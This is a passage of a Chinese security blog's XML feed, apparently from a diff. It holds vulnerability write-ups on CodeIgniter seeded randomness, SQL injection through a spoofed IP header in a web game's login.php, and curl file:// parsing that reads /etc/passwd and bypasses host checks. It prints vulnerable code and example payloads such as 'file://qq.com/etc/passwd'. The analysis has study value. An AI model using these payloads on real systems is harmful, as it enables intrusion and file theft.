+<p>如果说框架没有问题，想跑出来这个这个目录个人电脑要进行上亿次的请求，这几乎不可能。但是当框架帮我们固定了随机数种子之后，一切都变得so easy。</p>
+<p>同理如果cookie生成，csrf生成用到了rand()函数，全部都会被击溃。</p>
+<p>千里之堤，溃于蚁穴。</p>
+<p>攻击者发送请求<br><img src="/2017/10/10/CodeIgniter-Vul/1046971727.png" alt="85D4315C-97CC-4B00-8857-BCD997B78171.png"></p>
+<p>根据服务器返回的时间，转为时间戳<br><img src="/2017/10/10/CodeIgniter-Vul/1380875732.png" alt="E51B8868-12C2-405F-8ED5-05F26BBEF52D.png"></p>
+<p>根据时间戳计算加密过后的目录</p>
+<p><img src="/2017/10/10/CodeIgniter-Vul/2410727766.png" alt="1CD3FE40-8187-4BFD-A37C-E3D5256C97F3.png"></p>
+<p>服务器上攻击者攻击之后生成的目录</p>
+<p><img src="/2017/10/10/CodeIgniter-Vul/1478495625.png" alt="F50ED45C-F8E9-447A-9ED2-49CBE8DCE5EF.png"></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> 伪随机数 </tag>
+            
+            <tag> CodeIgniter </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[网页游戏《BR大逃杀》一枚小0Day]]></title>
+      <url>/2017/10/10/BR%E5%A4%A7%E9%80%83%E6%9D%80/</url>
+      <content type="html"><![CDATA[<p>呵呵，昨晚和初中同学叙旧，两个人无聊找了一款网页游戏BR大逃杀玩，今天把这个网页游戏下下来简单审计了一下源码。</p>
+<a id="more"></a>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</div><div class="line">set_magic_quotes_runtime(<span class="number">0</span>);</div><div class="line"><span class="comment">//ini_set('date.timezone','Asia/Shanghai');</span></div><div class="line">$now = time();</div><div class="line">define(<span class="string">'IN_GAME'</span>, <span class="keyword">TRUE</span>);</div><div class="line">define(<span class="string">'GAME_ROOT'</span>, substr(dirname(<span class="keyword">__FILE__</span>), <span class="number">0</span>, <span class="number">0</span>));</div><div class="line">define(<span class="string">'GAMENAME'</span>, <span class="string">'bra'</span>);</div><div class="line"><span class="keyword">if</span>(PHP_VERSION &lt; <span class="string">'4.3.0'</span>) &#123;</div><div class="line"><span class="keyword">exit</span>(<span class="string">'PHP version must &gt;= 4.3.0!'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./include/global.func.php'</span>;</div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./config.inc.php'</span>;</div><div class="line"></div><div class="line">extract(gaddslashes($_COOKIE));</div><div class="line">extract(gaddslashes($_POST));</div><div class="line">extract(gaddslashes($_GET));</div><div class="line"></div><div class="line"><span class="keyword">if</span>($attackevasive) &#123;</div><div class="line"><span class="keyword">include_once</span> GAME_ROOT.<span class="string">'./include/security.inc.php'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($gzipcompress &amp;&amp; function_exists(<span class="string">'ob_gzhandler'</span>) &amp;&amp; CURSCRIPT != <span class="string">'wap'</span>) &#123;</div><div class="line">ob_start(<span class="string">'ob_gzhandler'</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">$gzipcompress = <span class="number">0</span>;</div><div class="line">ob_start();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./include/db_'</span>.$database.<span class="string">'.class.php'</span>;</div><div class="line">$db = <span class="keyword">new</span> dbstuff;</div><div class="line">$db-&gt;connect($dbhost, $dbuser, $dbpw, $dbname, $pconnect);</div><div class="line"><span class="keyword">unset</span>($dbhost, $dbuser, $dbpw, $dbname, $pconnect);</div><div class="line">$db-&gt;select_db($dbname);</div><div class="line"><span class="keyword">require_once</span> GAME_ROOT.<span class="string">'./gamedata/system.php'</span>;</div><div class="line"><span class="keyword">if</span>(!$username||!$password)&#123;</div><div class="line">gexit($_ERROR[<span class="string">'login_info'</span>],<span class="keyword">__file__</span>,<span class="keyword">__line__</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">include_once</span> GAME_ROOT.<span class="string">'./gamedata/system.php'</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'REMOTE_ADDR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line">$password = md5($password);</div><div class="line">$groupid = <span class="number">1</span>;</div><div class="line">$credits = <span class="number">0</span>;</div><div class="line">$gender = <span class="number">0</span>;</div><div class="line">$str = <span class="string">"SELECT * FROM &#123;$tablepre&#125;users WHERE username = '$username'"</span>;</div><div class="line">$result = $db-&gt;query(<span class="string">"SELECT * FROM &#123;$tablepre&#125;users WHERE username = '$username'"</span>);</div><div class="line"><span class="keyword">if</span>(!$db-&gt;num_rows($result)) &#123;</div><div class="line">$groupid = <span class="number">1</span>;</div><div class="line">$str = <span class="string">"INSERT INTO &#123;$tablepre&#125;users (username,`password`,groupid,ip,credits,gender) VALUES ('$username', '$password', '$groupid', '$onlineip', '$credits', '$gender')"</span>;</div><div class="line">$db-&gt;query(<span class="string">"INSERT INTO &#123;$tablepre&#125;users (username,`password`,groupid,ip,credits,gender) VALUES ('$username', '$password', '$groupid', '$onlineip', '$credits', '$gender')"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">$userdata = $db-&gt;fetch_array($result);</div><div class="line"><span class="keyword">if</span>($userdata[<span class="string">'groupid'</span>] &lt;= <span class="number">0</span>)&#123;</div><div class="line">gexit($_ERROR[<span class="string">'user_ban'</span>],<span class="keyword">__file__</span>,<span class="keyword">__line__</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>($userdata[<span class="string">'password'</span>] != $password) &#123;</div><div class="line">gexit($_ERROR[<span class="string">'login_check'</span>],<span class="keyword">__file__</span>,<span class="keyword">__line__</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">gsetcookie(<span class="string">'user'</span>,$username);</div><div class="line">gsetcookie(<span class="string">'pass'</span>,$password);</div><div class="line">&#125;</div><div class="line"></div><div class="line">Header(<span class="string">"Location: index.php"</span>);</div><div class="line"><span class="keyword">exit</span>();</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>以上这些是login.php的源码，程序员从15-17行进行了addslash()操作并且用了extract()函数解压出来，这两个函数都有相关的安全风险。<br>addslash()函数在数据库为gbk的条件下可以用宽字节注入，extract函数的话可以用数组进行变量覆盖（日常感谢黑哥等老一辈黑阔）</p>
+<p>看了一下下面进行sql查询的地方，因为数据库设置的是utf8格式的，所以暂时先放弃了宽字节注入的想法。</p>
+<p>接下来我发现下面的insert语句里面需要插入一个ip，根据以往的经验来看，php获取ip一共有3种方式，其中的2种方式都是有问题的。<br>使用X-Forward-For和HTTP_CLIENT_IP这两种都是客户端可以伪造的。<br>于是看一下ip是怎么取得的，获取ip的代码是如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = getenv(<span class="string">'REMOTE_ADDR'</span>);</div><div class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;</div><div class="line">$onlineip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>个人觉得程序猿没有注意到获取顺序，应该是<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>放在判断语句的第一个，不然就不会有下面的问题了。<br>上面那串代码获取了$onlineip，但要注意到$onlineip是从<code>$_SERVER</code>这个php的超全局变量获取的。程序开头只addslash了3个超全局变量，忽略了这个，所以下面insert语句是可以注入的。<br>所以接下来就可以用报错注入来注入了。<br><img src="/2017/10/10/BR大逃杀/2689502967.png" alt="F93EDEF9-CC09-479E-81F9-B5F70267FC74.png"><br><img src="/2017/10/10/BR大逃杀/2275247145.png" alt="66FF604A-1512-40CD-8858-E74C5ECA32CD.png"></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 漏洞分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 漏洞分析 </tag>
+            
+            <tag> 注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Curl类库解析url安全简读]]></title>
+      <url>/2017/10/10/Curl%E7%B1%BB%E5%BA%93%E8%A7%A3%E6%9E%90url%E5%AE%89%E5%85%A8%E7%AE%80%E8%AF%BB/</url>
+      <content type="html"><![CDATA[<p>##简介</p>
+<p>###什么是CURL<br>curl是利用URL语法在命令行方式下工作的开源文件传输工具。它被广泛应用在Unix、多种Linux发行版中，并且有DOS和Win32、Win64下的移植版本。</p>
+<a id="more"></a>
+<p>###正文<br>CURL是十分强大的开源命令行工具,支持以下这些协议</p>
+<blockquote>
+<p>DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMTP, SMTPS, Telnet and TFTP.</p>
+</blockquote>
+<p>wooyun案例:<br><a href="http://wooyun.org/bugs/wooyun-2010-012" target="_blank" rel="external">人人网的分享网页功能存在诸多安全漏洞 </a><br><a href="http://wooyun.org/bugs/wooyun-2010-03070" target="_blank" rel="external">微博–微收藏多处任意文件读取漏洞</a></p>
+<p>许多程序猿使用CURL类库的时候是不对传入的URL进行协议鉴别的.</p>
+<p>举个例子在最新版的骑士CMS中(20160604)有一个调用curl类库的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">https_request</span><span class="params">($url,$data = null)</span></span>&#123;</div><div class="line">$curl = curl_init();</div><div class="line">curl_setopt($curl, CURLOPT_URL, $url);</div><div class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</div><div class="line">curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($data))&#123;</div><div class="line">curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</div><div class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</div><div class="line">&#125;</div><div class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">$output = curl_exec($curl);</div><div class="line">curl_close($curl);</div><div class="line"><span class="keyword">return</span> $output;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>把这段代码单独扒拉下来稍作修改,然后调用一下可以很明显的看到,直接使用curl调用了<code>file://</code>协议对文件进行了读取</p>
+<p>我建立了一个测试文件路径为<code>/etc/test</code></p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/2484440844.png" alt="ED4CB388-15DA-40D8-B525-FB49B6442F85.png"></p>
+<p>测试文件里面将CURLOPT_URL设置为<code>file:///etc/test</code></p>
+<p>再访问测试文件<a href="http://test/test.php" target="_blank" rel="external">http://test/test.php</a></p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/1530548505.png" alt="3EE11F19-37AE-492F-B572-9630A6D9DDFF.png"></p>
+<p>可以看到原本打算进行http请求的函数转变成了文件读取.</p>
+<p>但是上面仅仅是最一般的情况,更多的情况是url是经过拼接之后再传入CURLOPT_URL这个选项的.</p>
+<p>for example:</p>
+<p>有一个api接口<br><a href="http://someapi.com/api.php?token={user_api_token}&amp;other_string" target="_blank" rel="external">http://someapi.com/api.php?token={user_api_token}&amp;other_string</a><br>通过拼接用户的api_token来传入curl类库进行http请求等操作.</p>
+<p>想要将使用http协议变成file协议来读取文件<br>,我们最好能够能覆盖前面一部分,并且摒弃后面一部分.</p>
+<p>那么想要做到上面的部分就要了解curl_setopt()这个函数的源代码了.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(curl_setopt)</div><div class="line">&#123;</div><div class="line">zval       *zid, **zvalue;</div><div class="line">long        options;</div><div class="line">php_curl   *ch;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">"rlZ"</span>, &amp;zid, &amp;options, &amp;zvalue) == FAILURE) &#123;</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ZEND_FETCH_RESOURCE(ch, php_curl *, &amp;zid, <span class="number">-1</span>, le_curl_name, le_curl);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (options &lt;= <span class="number">0</span> &amp;&amp; options != CURLOPT_SAFE_UPLOAD) &#123;</div><div class="line">php_error_docref(<span class="keyword">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Invalid curl configuration option"</span>);</div><div class="line">RETURN_FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (_php_curl_setopt(ch, options, zvalue TSRMLS_CC) == SUCCESS) &#123;</div><div class="line">RETURN_TRUE;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">RETURN_FALSE;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>(看懂PHP的函数源码需要一点PHP扩展方面的知识,推荐看看鸟哥laruence的博客和百度)</p>
+<p>里面调用了<code>_php_curl_setopt()</code>这个函数,其中进入的是这个case</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> CURLOPT_URL:</div><div class="line">convert_to_string_ex(zvalue);</div><div class="line"><span class="keyword">return</span> php_curl_option_url(ch, Z_STRVAL_PP(zvalue), Z_STRLEN_PP(zvalue) TSRMLS_CC);</div></pre></td></tr></table></figure>
+<p>这个函数中唯一一个调用的函数原型贴在下面了<br>ext/curl/interface.c:206行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">php_curl_option_url</span><span class="params">(php_curl *ch, <span class="keyword">const</span> <span class="keyword">char</span> *url, <span class="keyword">const</span> <span class="keyword">int</span> len TSRMLS_DC)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">/* Disable file:// if open_basedir are used */</span></div><div class="line"><span class="keyword">if</span> (PG(open_basedir) &amp;&amp; *PG(open_basedir)) &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> LIBCURL_VERSION_NUM &gt;= 0x071304</span></div><div class="line">curl_easy_setopt(ch-&gt;cp, CURLOPT_PROTOCOLS, CURLPROTO_ALL &amp; ~CURLPROTO_FILE);</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">php_url *uri;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(uri = php_url_parse_ex(url, len))) &#123;</div><div class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Invalid URL '%s'"</span>, url);</div><div class="line"><span class="keyword">return</span> FAILURE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (uri-&gt;scheme &amp;&amp; !strncasecmp(<span class="string">"file"</span>, uri-&gt;scheme, <span class="keyword">sizeof</span>(<span class="string">"file"</span>))) &#123;</div><div class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Protocol 'file' disabled in cURL"</span>);</div><div class="line">php_url_free(uri);</div><div class="line"><span class="keyword">return</span> FAILURE;</div><div class="line">&#125;</div><div class="line">php_url_free(uri);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> php_curl_option_str(ch, CURLOPT_URL, url, len, <span class="number">0</span> TSRMLS_CC);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到程序首先就判断了是否设置了<br>open_basedir,如果设置了将直接防止使用<code>file:</code>协议进行文件的读取,所以可以考虑作为一个防御方案:)</p>
+<p>在进入第一个if判断语句,首先php里面的curl类库调用了php源码里php_url_parse_ex这个函数来解析url,php的函数parse_url()函数也是调用的php_url_parse_ex这个函数来解析url.</p>
+<p>但是主要php_url_parse_ex这个函数在这里的作用就是解析这个url使用了什么协议,再根据解析出来的协议使用值<code>uri-&gt;scheme</code>对比是否是<code>file</code>协议,相当于在上层做了一个判断,并不是解析好了之后将处理过后的值放入curl类库里的函数再解析一遍url.</p>
+<p>经过追踪函数定位到lib/url.c:parseurlandfillconn()为curl类库里面进行url解析的函数</p>
+<p>首先<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((<span class="number">2</span> == <span class="built_in">sscanf</span>(data-&gt;change.url, <span class="string">"%15[^:]:%[^\n]"</span>,</div><div class="line">protobuf, path)) &amp;&amp;</div><div class="line">Curl_raw_equal(protobuf, <span class="string">"file"</span>)) &#123;</div><div class="line"><span class="keyword">if</span>(path[<span class="number">0</span>] == <span class="string">'/'</span> &amp;&amp; path[<span class="number">1</span>] == <span class="string">'/'</span>) &#123;</div><div class="line"><span class="comment">/* Allow omitted hostname (e.g. file:/&lt;path&gt;).  This is not strictly</span></div><div class="line"><span class="comment">* speaking a valid file: URL by RFC 1738, but treating file:/&lt;path&gt; as</span></div><div class="line"><span class="comment">* file://localhost/&lt;path&gt; is similar to how other schemes treat missing</span></div><div class="line"><span class="comment">* hostnames.  See RFC 1808. */</span></div><div class="line"></div><div class="line"><span class="comment">/* This cannot be done with strcpy() in a portable manner, since the</span></div><div class="line"><span class="comment">memory areas overlap! */</span></div><div class="line">memmove(path, path + <span class="number">2</span>, <span class="built_in">strlen</span>(path + <span class="number">2</span>)+<span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>首先可以看curl先取了<code>:</code>符号之前的字符转换成大写之后再和<code>file</code>进行对比.程序猿还在注释里面写了这么一段话.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">`      /* Allow omitted hostname (e.g. file:/&lt;path&gt;).  This is not strictly</div><div class="line">* speaking a valid file: URL by RFC 1738, but treating file:/&lt;path&gt; as</div><div class="line">* file://localhost/&lt;path&gt; is similar to how other schemes treat missing</div><div class="line">* hostnames.  See RFC 1808. */</div></pre></td></tr></table></figure>
+<p>程序猿是想兼容RFC1808协议,RFC1808协议里对file协议的规定</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">The file URL scheme is used to designate files accessible on a</div><div class="line">particular host computer. This scheme, unlike most other URL schemes,</div><div class="line">does not designate a resource that is universally accessible over the</div><div class="line">Internet.</div><div class="line"></div><div class="line">A file URL takes the form:</div><div class="line"></div><div class="line">file://&lt;host&gt;/&lt;path&gt;</div><div class="line"></div><div class="line">where &lt;host&gt; is the fully qualified domain name of the system on</div><div class="line">which the &lt;path&gt; is accessible, and &lt;path&gt; is a hierarchical</div><div class="line">directory path of the form &lt;directory&gt;/&lt;directory&gt;/.../&lt;name&gt;.</div><div class="line"></div><div class="line">For example, a VMS file</div><div class="line"></div><div class="line">DISK$USER:[MY.NOTES]NOTE123456.TXT</div><div class="line"></div><div class="line">might become</div><div class="line"></div><div class="line">&lt;URL:file://vms.host.edu/disk$user/my/notes/note12345.txt&gt;</div><div class="line"></div><div class="line">As a special case, &lt;host&gt; can be the string &quot;localhost&quot; or the empty</div><div class="line">string; this is interpreted as `the machine from which the URL is</div><div class="line">being interpreted&apos;.</div><div class="line"></div><div class="line">The file URL scheme is unusual in that it does not specify an</div><div class="line">Internet protocol or access method for such files; as such, its</div><div class="line">utility in network protocols between hosts is limited.</div></pre></td></tr></table></figure>
+<p>我把程序前一部分的逻辑画了张图</p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/2977385263.png" alt="0BE7BB73-540C-4AC1-9F70-6F10BD2494F7.png"></p>
+<p>会发现这个函数把file://{somedomain.com}/etc/passwd<br>上面{}中的所有给忽略掉,而只使用path,即使是别的域名也会最终读取到本地的对应文件中.</p>
+<p>所以假设一个情况:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var_dump(parse_url('file://qq.com/etc/passwd'));</div></pre></td></tr></table></figure>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/1348378091.png" alt="EE517382-32FD-49CE-81C5-33DD29C29982.png"></p>
+<p>给curl类库执行的话,依旧读取的是本地的/etc/passwd文件</p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/2074501187.png" alt="4E3A034C-90EF-4357-BEE3-8D36DE2D50BB.png"></p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/3229707656.png" alt="3B2DB8AC-DB96-41F2-9FC6-339420C50079.png"></p>
+<p>所以可以想象一下一个场景</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$url = $_GET[<span class="string">'url'</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$info = parse_url($url);</div><div class="line">$host = $info[<span class="string">'host'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($host !== $_SERVER[<span class="string">'HTTP_HOST'</span>])&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"It's not baidu.com!Illegal Host!"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (function_exists(<span class="string">'curl_init'</span>) &amp;&amp; function_exists(<span class="string">'curl_exec'</span>)) &#123;</div><div class="line">$ch = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">$data = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">curl($url);</div></pre></td></tr></table></figure>
+<p>如果程序猿对curl访问的host做了限制,其实可以绕过host的限制,继续进行文件读取:sunglasses:</p>
+<p><img src="/2017/10/10/Curl类库解析url安全简读/1035969849.png" alt="BCE27DB3-90B1-424C-BC1A-0BC3FC14A937.png"></p>
+<p>而回到最一开始的那个问题,如果程序猿单单对url后半部分进行了拼接,没有进行<code>:</code>符号前面的协议判断,是可以通过<code>?</code>号,<code>file://qq.com/etc/passwd?+{user+token}</code>来继续执行文件协议读取.</p>
+<p>例子:<br><img src="/2017/10/10/Curl类库解析url安全简读/1208036310.png" alt="6ED8C152-EF4C-4E84-9CE1-473309950DE1.png"></p>
+<p>如果绕过了host,但是后面有拼接</p>
